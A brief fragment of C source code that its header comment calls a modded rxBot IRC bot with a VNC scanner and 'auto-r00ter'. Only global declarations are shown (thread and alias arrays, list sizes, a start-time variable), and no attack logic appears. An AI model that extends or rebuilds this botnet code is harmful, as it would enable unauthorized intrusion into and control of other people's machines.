/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/


// threads structure
THREAD threads[MAXTHREADS]; 

// aliases structure
ALIAS aliases[MAXALIASES];
int anum = 0;

extern ALIAS aliases[MAXALIASES];
extern int anum;

// array sizes
int authsize = (sizeof(authost) / sizeof(LPTSTR));
int versionsize = (sizeof(versionlist)/sizeof(LPTSTR));

// misc.
DWORD started;
